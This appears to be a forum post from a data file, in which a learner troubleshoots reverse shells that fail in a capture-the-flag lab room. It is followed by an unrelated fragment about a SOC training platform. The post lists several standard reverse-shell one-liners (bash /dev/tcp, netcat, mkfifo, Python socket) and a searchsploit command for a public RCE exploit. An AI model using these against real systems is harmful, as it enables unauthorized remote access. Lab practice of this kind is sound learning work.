      "text": "I have been trying to troubleshoot this issue but I cant seem to figure it out, i hope someone smarter than me can help me solve this. I have tried 3 separate rooms where you need a reverse shell and on each one of them i just stopped it there and moved on to a different room because i cant get it to work. I am doing the Ignite room right now.\n\nLet me provide some more information about my situation and what ive tried\n\nWhen i run \"ip a s tun0\" i see this line: \"inet [192.168.176.10/17](http://192.168.176.10/17) scope global tun0\" and so i use [192.168.176.10](http://192.168.176.10) for my reverse shells\n\nI can do everything normally like nmap, accessing ssh, using the webserver, using ftp, etc. but i cant get the reverse shell.\n\nWhen i accidentally typed in a 10.x.x.x address in the reverse shell cmd it hung for a while but when i use my correct ip it dies immediately\n\nMy VPN server name is US East (N. Virginia)\n\nI am using ports 4444 and 9999. I also tried other ports but not as much as 4444 and 9999.\n\nI am using Terminator as my terminal emulator and inside of Terminator i am running tmux to run my openvpn\n\nI tried using multiple standard terminals for my vpn, netcat, and reverse shell cmd and still nothing changed\n\nI use nc -lnvp {port}\n\nwhen i run ss -tuln | grep {port} i do see my netcat is listening on the correct port\n\nwhen i run sudo ufw status i get inactive\n\nthe ip of the box is always 10.x.x.x\n\nThese are the reverse shells i am trying are from [pentestmonkey.net](http://pentestmonkey.net) :\n\nbash -i >& /dev/tcp/192.168.176.10/4444 0>&1\n\nnc -e /bin/sh [192.168.176.10](http://192.168.176.10) 4444\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [192.168.176.10](http://192.168.176.10) 4444 >/tmp/f\n\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM);s.connect((\"192.168.176.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\\[\"/bin/sh\",\"-i\"\\]);'\n\nI tried doing php reverse shells using a file upload on the other 2 boxes and thats where the website hung for a bit when i accidentally ran the reverse shell using a 10.x.x.x address.\n\nIve downloaded 3 new openvpn configuration files and i run sudo openvpn us-east-1-AlexAGamer-regular.ovpn to connect to the vpn\n\nI run sudo apt update; sudo apt upgrade -y; sudo apt autoremove every time i boot into my machine\n\nIm on Ubuntu 24.04\n\nIf you want to try out the room to see for yourself go into the Ignite room where you can get RCE, to do this use \"searchsploit -m php/webapps/50477.py\" and run \"python3 [50477.py](http://50477.py) \\-u http://{box ip}\" then you can try to get a reverse shell for yourself.\n\nI have no clue why its not working but i hope maybe someone else could help me figure out whats wrong.\n\nEDIT :\n\nI had reset my ufw settings but i also had firewall-cmd installed and i didnt reset those",

Just do not expect super deep, messy real world scenarios. A lot of it is guided and cleaner than actual SOC life.\n\nIf you are not a beginner, you will probably move through some modules fast. It is good for structured practice and refreshing concepts, but not enough on its own for advanced blue team growth.\n\nI would use it as a supplement. Pair it with your own lab, tune detections, break things, see what your SIEM misses. That is where you really level up.",
